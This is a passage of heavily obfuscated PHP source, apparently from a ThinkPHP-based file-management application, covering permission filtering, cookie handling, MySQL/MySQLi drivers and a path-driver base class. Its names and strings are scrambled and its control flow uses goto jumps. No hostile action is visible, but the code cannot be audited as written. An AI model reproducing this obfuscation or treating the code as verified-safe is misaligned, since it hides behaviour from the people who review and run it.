$¹êŸ÷Ø–); $¹êŸ÷Ø–[$€‘˜†ëö[1923]] = $this->getSort(); $this->filterAuth($¹êŸ÷Ø–[$€‘˜†ëö[457]]); return parent::insert($¹êŸ÷Ø–); } private function getSort() { $è¾ÂË– =& $_SERVER[ò«¥Ê‡å]; $é¸ëàÂû = parent::listData(); $àšà¾± = array_to_keyvalue($é¸ëàÂû, $è¾ÂË–[12], $è¾ÂË–[1923]); return empty($àšà¾±) ? 0 : max($àšà¾±) + 1; } private function filterAuth(&$Şçç•á¤) { if (!$Şçç•á¤) { return; } $†åååşÕ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ëı¬õ”¦ = array(); foreach ($†åååşÕ as $Óú«°ñ‚) { if ($Şçç•á¤ & $Óú«°ñ‚) { $Ëı¬õ”¦[] = $Óú«°ñ‚; } } if (in_array(self::AUTH_ROOT, $Ëı¬õ”¦)) { $Şçç•á¤ = array_sum($†åååşÕ); return; } $æ«‘ôˆû = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ëı¬õ”¦ as $Óú«°ñ‚) { if (isset($æ«‘ôˆû[$Óú«°ñ‚])) { $Ëı¬õ”¦ = array_merge($Ëı¬õ”¦, $æ«‘ôˆû[$Óú«°ñ‚]); } } $Ëı¬õ”¦[] = self::AUTH_SHOW; $Şçç•á¤ = array_sum(array_unique($Ëı¬õ”¦)); } public function sort($Ô™ñİôÄ, $Ìé¯½Õ) { return parent::update($Ô™ñİôÄ, $Ìé¯½Õ); } } goto B×¸ˆ ¥Éó; a§ÄáÊĞ¹ô: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Ó©œøäİ = '', $…±Ìøì³ = 0) { if (is_string($Ó©œøäİ) && $Ó©œøäİ != $_SERVER[ò«¥Ê‡å][12]) { $this->prefix = $Ó©œøäİ; } if (is_numeric($…±Ìøì³) && $…±Ìøì³ > 0) { $this->expire = $…±Ìøì³; } } public static function getInstance() { static $û âÍº¬; if ($û âÍº¬ === null) { $û âÍº¬ = new self(); } return $û âÍº¬; } private static $cookieDisable = false; public static function disable($ãïß÷) { self::$cookieDisable = $ãïß÷; } private static $sameCookieSet = array(); public static function set($–¢ »˜®, $Ö‚ñúƒÎ, $¼ø·§Œ = 0, $‘Ó°áà˜ = false, $§Ñõ…·Â = false) { $Ã¸˜¦—æ =& $_SERVER[ò«¥Ê‡å]; if (self::$cookieDisable) { return; } if (!$¼ø·§Œ) { $¼ø·§Œ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$–¢ »˜®]) && self::$sameCookieSet[$–¢ »˜®] == $Ö‚ñúƒÎ . $¼ø·§Œ) { return; } self::$sameCookieSet[$–¢ »˜®] = $Ö‚ñúƒÎ . $¼ø·§Œ; if (!$§Ñõ…·Â) { $§Ñõ…·Â = str_replace(HOST, $Ã¸˜¦—æ[12], APP_HOST); $§Ñõ…·Â = _get($GLOBALS, $Ã¸˜¦—æ[929], $§Ñõ…·Â); } $èÄØîÕÛ = $Ã¸˜¦—æ[12]; setcookie($–¢ »˜®, $Ö‚ñúƒÎ, time() + $¼ø·§Œ, $Ã¸˜¦—æ[8] . trim($§Ñõ…·Â, $Ã¸˜¦—æ[8]) . $èÄØîÕÛ, !1, !1, $‘Ó°áà˜); } public static function setSafe($ªîü‘ÍÅ, $Ø‚ÜîÉõ, $”ï½Ş³ó = 0) { self::set($ªîü‘ÍÅ, $Ø‚ÜîÉõ, $”ï½Ş³ó, !0); } public static function get($­ĞèºÓí) { static $ê¸„– = false; if (!$ê¸„–) { self::initHeaderCookie(); $ê¸„– = !0; } return isset($_COOKIE[$­ĞèºÓí]) ? $_COOKIE[$­ĞèºÓí] : !1; } private static function initHeaderCookie() { $´Ìõí¸ =& $_SERVER[ò«¥Ê‡å]; if (!isset($_SERVER[$´Ìõí¸[930]]) || !$_SERVER[$´Ìõí¸[930]]) { return; } $¸Çú–§ = explode($´Ìõí¸[73], $_SERVER[$´Ìõí¸[930]]); foreach ($¸Çú–§ as $ìÓåùÜ‚) { $ìÓåùÜ‚ = explode($´Ìõí¸[931], $ìÓåùÜ‚); if (count($ìÓåùÜ‚) != 2 || !isset($ìÓåùÜ‚[1])) { continue; } $_COOKIE[trim($ìÓåùÜ‚[0])] = trim($ìÓåùÜ‚[1]); } } public static function remove($«©ØÓï¿, $Ú›½âĞ“ = false) { unset($_COOKIE[$«©ØÓï¿]); self::set($«©ØÓï¿, $_SERVER[ò«¥Ê‡å][12], 1, $Ú›½âĞ“); } } class DbMysql extends Db { public function __construct($Œµ¤ÃÍ¯ = '') { $Éñî§Â‡ =& $_SERVER[ò«¥Ê‡å]; if (!extension_loaded($Éñî§Â‡[850])) { think_exception(think_lang($Éñî§Â‡[14]) . $Éñî§Â‡[932]); } if (!empty($Œµ¤ÃÍ¯)) { $this->config = $Œµ¤ÃÍ¯; if (empty($this->config[$Éñî§Â‡[17]])) { $this->config[$Éñî§Â‡[17]] = $Éñî§Â‡[12]; } } } public function connect($¿®‰‹Û‚ = '', $ğí¶£ÊŠ = 0, $¯ƒ‡Øó¦ = false) { $Äæ¤­ûÅ =& $_SERVER[ò«¥Ê‡å]; if (!isset($this->linkID[$ğí¶£ÊŠ])) { if (empty($¿®‰‹Û‚)) { $¿®‰‹Û‚ = $this->config; } $Óšñíá‘ = $¿®‰‹Û‚[$Äæ¤­ûÅ[933]] . ($¿®‰‹Û‚[$Äæ¤­ûÅ[934]] ? "\72{$¿®‰‹Û‚[$Äæ¤­ûÅ[934]]}" : $Äæ¤­ûÅ[12]); $èìü·˜Ğ = !empty($¿®‰‹Û‚[$Äæ¤­ûÅ[17]][$Äæ¤­ûÅ[18]]) ? $¿®‰‹Û‚[$Äæ¤­ûÅ[17]][$Äæ¤­ûÅ[18]] : $this->pconnect; if ($èìü·˜Ğ) { $this->linkID[$ğí¶£ÊŠ] = mysql_pconnect($Óšñíá‘, $¿®‰‹Û‚[$Äæ¤­ûÅ[935]], $¿®‰‹Û‚[$Äæ¤­ûÅ[936]], 131072); } else { $this->linkID[$ğí¶£ÊŠ] = mysql_connect($Óšñíá‘, $¿®‰‹Û‚[$Äæ¤­ûÅ[935]], $¿®‰‹Û‚[$Äæ¤­ûÅ[936]], !0, 131072); } if (!$this->linkID[$ğí¶£ÊŠ] || !empty($¿®‰‹Û‚[$Äæ¤­ûÅ[21]]) && !mysql_select_db($¿®‰‹Û‚[$Äæ¤­ûÅ[21]], $this->linkID[$ğí¶£ÊŠ])) { think_exception(mysql_error()); } $¦ê‹éÁ = mysql_get_server_info($this->linkID[$ğí¶£ÊŠ]); mysql_query($Äæ¤­ûÅ[937] . think_config($Äæ¤­ûÅ[938]) . $Äæ¤­ûÅ[58], $this->linkID[$ğí¶£ÊŠ]); if ($¦ê‹éÁ > $Äæ¤­ûÅ[939]) { mysql_query($Äæ¤­ûÅ[940], $this->linkID[$ğí¶£ÊŠ]); } $this->connected = !0; if (1 != think_config($Äæ¤­ûÅ[22])) { unset($this->config); } } return $this->linkID[$ğí¶£ÊŠ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($šÚèˆ¬) { $Õ‚åÇÍĞ =& $_SERVER[ò«¥Ê‡å]; if (0 === stripos($šÚèˆ¬, $Õ‚åÇÍĞ[310])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $šÚèˆ¬; if ($this->queryID) { $this->free(); } think_action_status($Õ‚åÇÍĞ[23], 1); think_status($Õ‚åÇÍĞ[24]); $this->queryID = mysql_query($šÚèˆ¬, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($€«Û¾­) { $àˆºê¾ =& $_SERVER[ò«¥Ê‡å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $€«Û¾­; if ($this->queryID) { $this->free(); } think_action_status($àˆºê¾[25], 1); think_status($àˆºê¾[24]); $áºı»ê = mysql_query($€«Û¾­, $this->_linkID); $this->debug(); if (!1 === $áºı»ê) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ò«¥Ê‡å][941], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¡Ñ…ê¯• = mysql_query($_SERVER[ò«¥Ê‡å][942], $this->_linkID); $this->transTimes = 0; if (!$¡Ñ…ê¯•) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Œì±†‡ä = mysql_query($_SERVER[ò«¥Ê‡å][943], $this->_linkID); $this->transTimes = 0; if (!$Œì±†‡ä) { $this->error(); return !1; } } return !0; } private function getAll() { $»‘šÂº‘ = array(); if ($this->numRows > 0) { while ($Õİ¶§Ÿç = mysql_fetch_assoc($this->queryID)) { $»‘šÂº‘[] = $Õİ¶§Ÿç; } mysql_data_seek($this->queryID, 0); } return $»‘šÂº‘; } public function getFields($ï„ŞãÃÒ) { $åùæ³ë® =& $_SERVER[ò«¥Ê‡å]; $òÔíğÍê = $this->query($åùæ³ë®[944] . $this->parseKey($ï„ŞãÃÒ)); $Úµ‰‰ñµ = array(); if ($òÔíğÍê) { foreach ($òÔíğÍê as $ÊÍÌöÊÒ => $áŠ¡) { $Úµ‰‰ñµ[$áŠ¡[$åùæ³ë®[31]]] = array($åùæ³ë®[32] => $áŠ¡[$åùæ³ë®[31]], $åùæ³ë®[33] => $áŠ¡[$åùæ³ë®[34]], $åùæ³ë®[35] => (bool) (strtoupper($áŠ¡[$åùæ³ë®[36]]) === $åùæ³ë®[945]), $åùæ³ë®[37] => $áŠ¡[$åùæ³ë®[38]], $åùæ³ë®[39] => strtolower($áŠ¡[$åùæ³ë®[40]]) == $åùæ³ë®[41], $åùæ³ë®[42] => strtolower($áŠ¡[$åùæ³ë®[43]]) == $åùæ³ë®[44]); } } return $Úµ‰‰ñµ; } public function getTables($Î¯£—‡£ = '') { $•æºÑŠ¯ =& $_SERVER[ò«¥Ê‡å]; if (!empty($Î¯£—‡£)) { $Ğê“×œä = $•æºÑŠ¯[946] . $Î¯£—‡£ . $•æºÑŠ¯[947]; } else { $Ğê“×œä = $•æºÑŠ¯[948]; } $ìüŞ•èØ = $this->query($Ğê“×œä); $äÈÓ‡Ç = array(); foreach ($ìüŞ•èØ as $Œ‰âŠÍÜ => $»¸²°ÕÖ) { $äÈÓ‡Ç[$Œ‰âŠÍÜ] = current($»¸²°ÕÖ); } return $äÈÓ‡Ç; } public function replace($Ü“ã¨­Å, $Õœè‚ÍÙ = array()) { $×½¥¦–î =& $_SERVER[ò«¥Ê‡å]; foreach ($Ü“ã¨­Å as $¼¬«¶¯ => $€¶™Šƒò) { $­×­È = $this->parseValue($€¶™Šƒò); if (is_scalar($­×­È)) { $ñè³œîØ[] = $­×­È; $¥ø™ÀƒĞ[] = $this->parseKey($¼¬«¶¯); } } $“Ú‹¹ì = $×½¥¦–î[949] . $this->parseTable($Õœè‚ÍÙ[$×½¥¦–î[325]]) . $×½¥¦–î[950] . implode($×½¥¦–î[50], $¥ø™ÀƒĞ) . $×½¥¦–î[951] . implode($×½¥¦–î[50], $ñè³œîØ) . $×½¥¦–î[952]; return $this->execute($“Ú‹¹ì); } public function insertAll($¯äëêü, $ÛÜå’” = array(), $ğ¯À«İ = false) { $¿…Î‡ã¬ =& $_SERVER[ò«¥Ê‡å]; if (!is_array($¯äëêü[0])) { return !1; } $×†œó’ = array_keys($¯äëêü[0]); $ Ú¸› = array(); foreach ($¯äëêü as $ÔİŒÉı¤) { $ëÈ»ïÛ = array(); foreach ($ÔİŒÉı¤ as $­Éó‘Ã => $ÀöªâÊ) { $ÀöªâÊ = $this->parseValue($ÀöªâÊ); if (is_scalar($ÀöªâÊ)) { $ëÈ»ïÛ[] = $ÀöªâÊ; } } $ Ú¸›[] = $¿…Î‡ã¬[306] . implode($¿…Î‡ã¬[50], $ëÈ»ïÛ) . $¿…Î‡ã¬[952]; } array_walk($×†œó’, array($this, $¿…Î‡ã¬[953])); $ïË•Øğ¶ = ($ğ¯À«İ ? $¿…Î‡ã¬[954] : $¿…Î‡ã¬[955]) . $¿…Î‡ã¬[956] . $this->parseTable($ÛÜå’”[$¿…Î‡ã¬[325]]) . $¿…Î‡ã¬[950] . implode($¿…Î‡ã¬[50], $×†œó’) . $¿…Î‡ã¬[957] . implode($¿…Î‡ã¬[50], $ Ú¸›); return $this->execute($ïË•Øğ¶); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $¡î±˜ğ¬ =& $_SERVER[ò«¥Ê‡å]; $this->error = mysql_errno() . $¡î±˜ğ¬[4] . mysql_error($this->_linkID); if ($¡î±˜ğ¬[12] != $this->queryStr) { $this->error .= LNG($¡î±˜ğ¬[48]) . $this->queryStr; } think_trace($this->error, $¡î±˜ğ¬[12], $¡î±˜ğ¬[49]); return $this->error; } public function escapeString($É±°çà) { if ($this->_linkID) { return mysql_real_escape_string($É±°çà, $this->_linkID); } else { return mysql_escape_string($É±°çà); } } public function parseKey(&$Ş¤½©Ä, $»äüÇ±› = true) { $›ªõ›Ëí =& $_SERVER[ò«¥Ê‡å]; if ($»äüÇ±›) { $Ş¤½©Ä = $this->parseKeyCheck($Ş¤½©Ä); } if ($Ş¤½©Ä != $›ªõ›Ëí[205] && !preg_match($›ªõ›Ëí[958], $Ş¤½©Ä)) { $Ş¤½©Ä = $›ªõ›Ëí[431] . trim($Ş¤½©Ä, $›ªõ›Ëí[431]) . $›ªõ›Ëí[431]; } return $Ş¤½©Ä; } } class DbMysqli extends Db { public function __construct($…Ãü–ñ = '') { $‘‚Â÷¢ =& $_SERVER[ò«¥Ê‡å]; if (!extension_loaded($‘‚Â÷¢[959])) { think_exception(think_lang($‘‚Â÷¢[14]) . $‘‚Â÷¢[960]); } if (!empty($…Ãü–ñ)) { $this->config = $…Ãü–ñ; if (empty($this->config[$‘‚Â÷¢[17]])) { $this->config[$‘‚Â÷¢[17]] = $‘‚Â÷¢[12]; } } } public function connect($ªö•ÓÅ¢ = '', $Æ˜ñëê = 0) { $ÒÅ¥òş™ =& $_SERVER[ò«¥Ê‡å]; if (!isset($this->linkID[$Æ˜ñëê])) { if (empty($ªö•ÓÅ¢)) { $ªö•ÓÅ¢ = $this->config; } $this->linkID[$Æ˜ñëê] = new mysqli($ªö•ÓÅ¢[$ÒÅ¥òş™[933]], $ªö•ÓÅ¢[$ÒÅ¥òş™[935]], $ªö•ÓÅ¢[$ÒÅ¥òş™[936]], $ªö•ÓÅ¢[$ÒÅ¥òş™[21]], $ªö•ÓÅ¢[$ÒÅ¥òş™[934]] ? intval($ªö•ÓÅ¢[$ÒÅ¥òş™[934]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¡úıƒŞ¼ = $this->linkID[$Æ˜ñëê]->server_version; $this->linkID[$Æ˜ñëê]->query($ÒÅ¥òş™[937] . think_config($ÒÅ¥òş™[938]) . $ÒÅ¥òş™[58]); if ($¡úıƒŞ¼ > $ÒÅ¥òş™[939]) { $this->linkID[$Æ˜ñëê]->query($ÒÅ¥òş™[940]); } $this->connected = !0; if (1 != think_config($ÒÅ¥òş™[22])) { unset($this->config); } } return $this->linkID[$Æ˜ñëê]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($úÉ÷ğ¨ä) { $äó¢’Š =& $_SERVER[ò«¥Ê‡å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $úÉ÷ğ¨ä; if ($this->queryID) { $this->free(); } think_action_status($äó¢’Š[23], 1); think_status($äó¢’Š[24]); $this->queryID = $this->_linkID->query($úÉ÷ğ¨ä); if ($this->_linkID->more_results()) { while (($õ¡½×Ã = $this->_linkID->next_result()) != NULL) { $õ¡½×Ã->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($§õ§œ›ˆ) { $ÃŸ»šêº =& $_SERVER[ò«¥Ê‡å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $§õ§œ›ˆ; if ($this->queryID) { $this->free(); } think_action_status($ÃŸ»šêº[25], 1); think_status($ÃŸ»šêº[24]); $Åá±®Í» = $this->_linkID->query($§õ§œ›ˆ); $this->debug(); if (!1 === $Åá±®Í») { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‘¼õø‚ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$‘¼õø‚) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ŸŠ£Š® = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ŸŠ£Š®) { $this->error(); return !1; } } return !0; } private function getAll() { $„¼äåƒŠ = array(); if ($this->numRows > 0) { for ($éæÎ×£Ú = 0; $éæÎ×£Ú < $this->numRows; $éæÎ×£Ú++) { $„¼äåƒŠ[$éæÎ×£Ú] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $„¼äåƒŠ; } public function getFields($Á«áûáÚ) { $¢¶”†Ì¡ =& $_SERVER[ò«¥Ê‡å]; $Ş¼ÌõŸê = $this->query($¢¶”†Ì¡[944] . $this->parseKey($Á«áûáÚ)); $‰ôø—ù— = array(); if ($Ş¼ÌõŸê) { foreach ($Ş¼ÌõŸê as $Á†å‹ô => $‡ô‰ƒ») { $‰ôø—ù—[$‡ô‰ƒ»[$¢¶”†Ì¡[31]]] = array($¢¶”†Ì¡[32] => $‡ô‰ƒ»[$¢¶”†Ì¡[31]], $¢¶”†Ì¡[33] => $‡ô‰ƒ»[$¢¶”†Ì¡[34]], $¢¶”†Ì¡[35] => (bool) ($‡ô‰ƒ»[$¢¶”†Ì¡[36]] === $¢¶”†Ì¡[12]), $¢¶”†Ì¡[37] => $‡ô‰ƒ»[$¢¶”†Ì¡[38]], $¢¶”†Ì¡[39] => strtolower($‡ô‰ƒ»[$¢¶”†Ì¡[40]]) == $¢¶”†Ì¡[41], $¢¶”†Ì¡[42] => strtolower($‡ô‰ƒ»[$¢¶”†Ì¡[43]]) == $¢¶”†Ì¡[44]); } } return $‰ôø—ù—; } public function getTables($‹µÄ´¶Æ = '') { $¼½àãÛ =& $_SERVER[ò«¥Ê‡å]; $ÖÉ¦üœ´ = !empty($‹µÄ´¶Æ) ? $¼½àãÛ[946] . $‹µÄ´¶Æ . $¼½àãÛ[947] : $¼½àãÛ[948]; $¡Û“‚ËÅ = $this->query($ÖÉ¦üœ´); $ÛÙøÈÛï = array(); if ($¡Û“‚ËÅ) { foreach ($¡Û“‚ËÅ as $£û«€‰à => $äÁ´ªºş) { $ÛÙøÈÛï[$£û«€‰à] = current($äÁ´ªºş); } } return $ÛÙøÈÛï; } public function replace($–ºÄ°¦, $ØİÄ£¦® = array()) { $¥ş¢¤ô¹ =& $_SERVER[ò«¥Ê‡å]; foreach ($–ºÄ°¦ as $Æñº™Ø => $Ù ‡æí) { $¬ŒÜÛ‡ = $this->parseValue($Ù ‡æí); if (is_scalar($¬ŒÜÛ‡)) { $—ÑÒö‚º[] = $¬ŒÜÛ‡; $†»µÄ„[] = $this->parseKey($Æñº™Ø); } } $ØÉëÇ•é = $¥ş¢¤ô¹[949] . $this->parseTable($ØİÄ£¦®[$¥ş¢¤ô¹[325]]) . $¥ş¢¤ô¹[950] . implode($¥ş¢¤ô¹[50], $†»µÄ„) . $¥ş¢¤ô¹[951] . implode($¥ş¢¤ô¹[50], $—ÑÒö‚º) . $¥ş¢¤ô¹[952]; return $this->execute($ØÉëÇ•é); } public function insertAll($Â›«´é¿, $´Î€–Àœ = array(), $×†‚èæ = false) { $øÂİÓÁÑ =& $_SERVER[ò«¥Ê‡å]; if (!is_array($Â›«´é¿[0])) { return !1; } $í‚”€… = array_keys($Â›«´é¿[0]); $Ôäû’ï = array(); foreach ($Â›«´é¿ as $’¬É˜±İ) { $ó§Àşİò = array(); foreach ($’¬É˜±İ as $ùí¶šü• => $Üî²ºş) { $Üî²ºş = $this->parseValue($Üî²ºş); if (is_scalar($Üî²ºş)) { $ó§Àşİò[] = $Üî²ºş; } } $Ôäû’ï[] = $øÂİÓÁÑ[306] . implode($øÂİÓÁÑ[50], $ó§Àşİò) . $øÂİÓÁÑ[952]; } array_walk($í‚”€…, array($this, $øÂİÓÁÑ[953])); $ãÇÁŒƒ  = $×†‚èæ ? $øÂİÓÁÑ[954] : $øÂİÓÁÑ[955]; $ê×‹€ĞÛ = $ãÇÁŒƒ  . $øÂİÓÁÑ[956] . $this->parseTable($´Î€–Àœ[$øÂİÓÁÑ[325]]) . $øÂİÓÁÑ[950] . implode($øÂİÓÁÑ[50], $í‚”€…) . $øÂİÓÁÑ[957] . implode($øÂİÓÁÑ[50], $Ôäû’ï); return $this->execute($ê×‹€ĞÛ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Áî˜Ú’ß =& $_SERVER[ò«¥Ê‡å]; $this->error = $this->_linkID->errno . $Áî˜Ú’ß[4] . $this->_linkID->error; if ($Áî˜Ú’ß[12] != $this->queryStr) { $this->error .= LNG($Áî˜Ú’ß[48]) . $this->queryStr; } think_trace($this->error, $Áî˜Ú’ß[12], $Áî˜Ú’ß[49]); return $this->error; } public function escapeString($ºşõÅ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ºşõÅ); } else { return addslashes($ºşõÅ); } } public function parseKey(&$ë¼Ã‰€, $Ïáç¯— = true) { $Ãºê¸æ =& $_SERVER[ò«¥Ê‡å]; if ($Ïáç¯—) { $ë¼Ã‰€ = $this->parseKeyCheck($ë¼Ã‰€); } if ($ë¼Ã‰€ != $Ãºê¸æ[205] && !preg_match($Ãºê¸æ[958], $ë¼Ã‰€)) { $ë¼Ã‰€ = $Ãºê¸æ[431] . trim($ë¼Ã‰€, $Ãºê¸æ[431]) . $Ãºê¸æ[431]; } return $ë¼Ã‰€; } } goto f¥ŠŒ—‹ÏŞ; D¬å¤˜»ƒ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ô¯óéø =& $_SERVER[ò«¥Ê‡å]; $this->objectDriver = array($ô¯óéø[60], $ô¯óéø[61], $ô¯óéø[62], $ô¯óéø[63], $ô¯óéø[64], $ô¯óéø[65], $ô¯óéø[66], $ô¯óéø[67], $ô¯óéø[68], $ô¯óéø[69], $ô¯óéø[70]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¢‹™èÉÚ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¢‹™èÉÚ, $_SERVER[ò«¥Ê‡å][8]); } return $¢‹™èÉÚ; } public function iconvApp($¡–€œÈ“) { return $¡–€œÈ“; } public function iconvSystem($÷ú€”Œ) { return $÷ú€”Œ; } public function iconvTo($‘ıæÜï§, $Ÿûüˆ˜, $¤ø……¿é) { $ŸÆ­¤š… =& $_SERVER[ò«¥Ê‡å]; if (!$‘ıæÜï§ || !function_exists($ŸÆ­¤š…[71])) { return $‘ıæÜï§; } static $øî’¾Ø³ = array(); $·«©å˜ú = $Ÿûüˆ˜ . $ŸÆ­¤š…[72] . $¤ø……¿é . $ŸÆ­¤š…[73] . $‘ıæÜï§; if (isset($øî’¾Ø³[$·«©å˜ú])) { return $øî’¾Ø³[$·«©å˜ú]; } if (function_exists($ŸÆ­¤š…[74])) { $Ïøê‘‚€ = @mb_convert_encoding($‘ıæÜï§, $¤ø……¿é, $Ÿûüˆ˜); } else { $Ïøê‘‚€ = @iconv($Ÿûüˆ˜, $¤ø……¿é, $‘ıæÜï§); } $Ïøê‘‚€ = $Ïøê‘‚€ ? $Ïøê‘‚€ : $‘ıæÜï§; if (strstr($Ïøê‘‚€, $ŸÆ­¤š…[75])) { $Ïøê‘‚€ = str_replace($ŸÆ­¤š…[75], $ŸÆ­¤š…[11], $Ïøê‘‚€); } $øî’¾Ø³[$Ÿûüˆ˜ . $ŸÆ­¤š…[72] . $¤ø……¿é . $ŸÆ­¤š…[73] . $‘ıæÜï§] = $Ïøê‘‚€; $øî’¾Ø³[$¤ø……¿é . $ŸÆ­¤š…[72] . $Ÿûüˆ˜ . $ŸÆ­¤š…[73] . $‘ıæÜï§] = $‘ıæÜï§; $øî’¾Ø³[$¤ø……¿é . $ŸÆ­¤š…[72] . $Ÿûüˆ˜ . $ŸÆ­¤š…[73] . $Ïøê‘‚€] = $‘ıæÜï§; $øî’¾Ø³[$Ÿûüˆ˜ . $ŸÆ­¤š…[72] . $¤ø……¿é . $ŸÆ­¤š…[73] . $Ïøê‘‚€] = $Ïøê‘‚€; return $Ïøê‘‚€; } public function getPathInner($—üü°§) { $¸ˆøöÍí = IO::init($—üü°§); return $¸ˆøöÍí->path; } public function getPathOuter($ˆçËºí) { $¦·Äõ”ˆ =& $_SERVER[ò«¥Ê‡å]; $ƒÌñô¤… = strlen(trim($this->pathBase, $¦·Äõ”ˆ[8])); $ˆçËºí = substr(trim($ˆçËºí, $¦·Äõ”ˆ[8]), $ƒÌñô¤…); return $this->pathDriver . $¦·Äõ”ˆ[8] . ltrim($ˆçËºí, $¦·Äõ”ˆ[8]); } public function isParentOf($Ø™¾Â¤˜, $Å¦ÄÚĞ) { $ÕÇÈÀ…‚ =& $_SERVER[ò«¥Ê‡å]; $Ø™¾Â¤˜ = rtrim(strtolower($Ø™¾Â¤˜), $ÕÇÈÀ…‚[8]) . $ÕÇÈÀ…‚[8]; $Å¦ÄÚĞ = rtrim(strtolower($Å¦ÄÚĞ), $ÕÇÈÀ…‚[8]) . $ÕÇÈÀ…‚[8]; $‘¨”Ä÷ş = strpos($Å¦ÄÚĞ, $Ø™¾Â¤˜) === 0; return $‘¨”Ä÷ş; } public function getType() { $ãÙäë„ =& $_SERVER[ò«¥Ê‡å]; $·’çê·ó = str_replace($ãÙäë„[76], $ãÙäë„[12], get_class($this)); return strtolower($·’çê·ó); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($‹µ‘Ä‡Ï, $Âµ­‚Ê¯) { $á¡é»Ğø =& $_SERVER[ò«¥Ê‡å]; $—ŠÉÀïğ = rtrim($‹µ‘Ä‡Ï, $á¡é»Ğø[8]) . $á¡é»Ğø[8] . $Âµ­‚Ê¯; $ìÔÕ½ä“ = $this->exist($—ŠÉÀïğ); return $ìÔÕ½ä“ ? $—ŠÉÀïğ : !1; } public function setModifyTime($ßÎ¥ñëŒ, $º™ß©½İ = '') { } public function renameObject($ƒàœ¸ß‚, $Çûª¤ò¬) { $ÙØ¼Ú¸ë = $Çûª¤ò¬; $ƒàœ¸ß‚ = $this->getPathOuter($ƒàœ¸ß‚); $Çûª¤ò¬ = $this->pathFather($ƒàœ¸ß‚) . $Çûª¤ò¬; $‘Û¯ŞÍ¢ = IO::copy($ƒàœ¸ß‚, $this->pathFather($ƒàœ¸ß‚), REPEAT_RENAME_FOLDER, $ÙØ¼Ú¸ë); if ($‘Û¯ŞÍ¢) { IO::remove($ƒàœ¸ß‚); } return $‘Û¯ŞÍ¢ ? $Çûª¤ò¬ : !1; } public function tempFile($üÜ¯ÆªÀ = '', $ğ˜Æ·Íè = '') { if (!$üÜ¯ÆªÀ) { $üÜ¯ÆªÀ = rand_string(15); } $­¶¹Ñ¾¯ = TEMP_FILES . rand_string(15) . $_SERVER[ò«¥Ê‡å][8]; @mkdir($­¶¹Ñ¾¯, DEFAULT_PERRMISSIONS, !0); $Ìøø‡Òß = $­¶¹Ñ¾¯ . $üÜ¯ÆªÀ; @touch($Ìøø‡Òß); if ($ğ˜Æ·Íè) { file_put_contents($Ìøø‡Òß, $ğ˜Æ·Íè); } return $Ìøø‡Òß; } public function tempFileRemve($ñ–áÉãÎ) { @unlink($ñ–áÉãÎ); @rmdir($this->pathFather($ñ–áÉãÎ)); } public function mkfile($©ë†¢¹„, $ƒÀ’…ı¶ = '', $è™‹Šç = REPEAT_RENAME) { } public function mkdir($Ü‡º“Íñ, $ü¦õğñø = REPEAT_SKIP) { } public function delFile($·±¹›¬æ) { } public function delFolder($µ¢­ŒÙ›) { } public function copyFile($ù‚Èˆíü, $şæ€‚ï) { } public function moveFile($öäñŸ , $À¹Ï§Ó“) { } public function remove($Ş¸˜ßš) { if ($this->isFile($Ş¸˜ßš)) { return $this->delFile($Ş¸˜ßš); } return $this->delFolder($Ş¸˜ßš); } public function rename($§ç…Ëî, $Ëõ¥æ¹ˆ) { } public function exist($ÔÒ‚±å ) { } public function findByHash($±±Şîµ = '', $¿áî…âµ = '') { return !1; } public function isFile($òÏæßÔ) { } public function isFolder($‰Ñú“¹¶) { } public function size($€ÑİËŒĞ) { } public function info($ÁŒÅÂæ) { } public function infoSimple($­¤Ş×Ã) { return 